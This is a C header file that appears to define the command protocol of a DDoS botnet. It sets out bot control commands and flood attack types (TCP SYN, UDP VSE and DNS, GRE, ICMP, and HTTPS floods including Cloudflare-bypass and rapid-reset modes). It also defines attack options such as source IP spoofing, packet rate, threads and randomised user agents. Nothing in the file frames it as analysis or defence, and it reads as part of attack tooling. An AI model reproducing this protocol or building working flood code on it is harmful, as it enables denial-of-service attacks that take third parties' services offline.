#pragma once

#ifndef PROTOCOL_H
#define PROTOCOL_H

#include <stdint.h>

#define CMD_PING        0x00
#define CMD_PONG        0x01
#define CMD_STOP        0x02
#define CMD_IDENTITY    0x03
#define CMD_STOP_TARGET 0x05
#define CMD_SYSINFO_REQ 0x06
#define CMD_SYSINFO_RESP 0x07
#define CMD_KILL        0x08

#define CMD_TCP         0x10
#define CMD_UDP         0x11
#define CMD_HTTP        0x12
#define CMD_ICMP        0x13
#define CMD_GRE         0x14
#define CMD_HTTPS       0x15

/* TCP: 4 modes */
#define MODE_TCP_SYN        0x00
#define MODE_TCP_ACK        0x01
#define MODE_TCP_HANDSHAKE  0x02
#define MODE_TCP_SOCKET     0x03

/* UDP: 3 modes */
#define MODE_UDP_PLAIN      0x00
#define MODE_UDP_VSE        0x01
#define MODE_UDP_DNS        0x02

/* ICMP: 1 mode */
#define MODE_ICMP_ECHO      0x00

/* GRE: 1 mode */
#define MODE_GRE_IP         0x00

/* HTTP: 1 mode */
#define MODE_HTTP_CFBYPASS  0x00

/* HTTPS: 4 modes */
#define MODE_HTTPS_FLOOD       0x00
#define MODE_HTTPS_CFBYPASS    0x01
#define MODE_HTTPS_RAPIDRESET  0x02
#define MODE_HTTPS_BROWSER     0x03

#define OPT_MODE        0x01
#define OPT_PSIZE       0x02
#define OPT_SRCPORT     0x03
#define OPT_THREADS     0x05
#define OPT_PPS         0x06
#define OPT_PAYLOAD     0x07

#define OPT_RAND        0x11

#define OPT_FRAG        0x12

#define OPT_TTL         0x13
#define OPT_TOS         0x14
#define OPT_SPOOF       0x15

#define OPT_TCPFLAGS    0x20
#define OPT_TCPOPTS     0x21

#define OPT_CONNS       0x23

#define OPT_METHOD      0x40
#define OPT_PATH        0x41
#define OPT_DOMAIN      0x42
#define OPT_COOKIE      0x43
#define OPT_REFERER     0x44
#define OPT_USERAGENT   0x45
#define OPT_UARAND      0x46
#define OPT_RANDPATH    0x47
#define OPT_POSTDATA    0x48
#define OPT_KEEPALIVE   0x4A
#define OPT_PIPELINE    0x4B
#define OPT_RATE        0x4C

#define PROTO_OFF_CMD       0
#define PROTO_OFF_IP        1
#define PROTO_OFF_PORT      5
#define PROTO_OFF_DURATION  7
#define PROTO_OFF_OPTIONS   11

#define PROTO_L4_HEADER_SIZE    11
#define PROTO_L3_HEADER_SIZE    9

#define IS_L3_ATTACK(cmd) ((cmd) == CMD_ICMP || (cmd) == CMD_GRE)

#define RAND_NONE       0
#define RAND_BASIC      1
#define RAND_MEDIUM     2
#define RAND_FULL       3

#define FRAG_NONE       0
#define FRAG_DF         1
#define FRAG_MF         2

#define SPOOF_NONE      0
#define SPOOF_RANDOM    1
#define SPOOF_CIDR      2
#define SPOOF_RANGE     3

/* TCP flags */
#define TCP_FLAG_FIN    0x01
#define TCP_FLAG_SYN    0x02
#define TCP_FLAG_RST    0x04
#define TCP_FLAG_PSH    0x08
#define TCP_FLAG_ACK    0x10
#define TCP_FLAG_URG    0x20
#define TCP_FLAG_ECE    0x40
#define TCP_FLAG_CWR    0x80

#endif // PROTOCOL_H
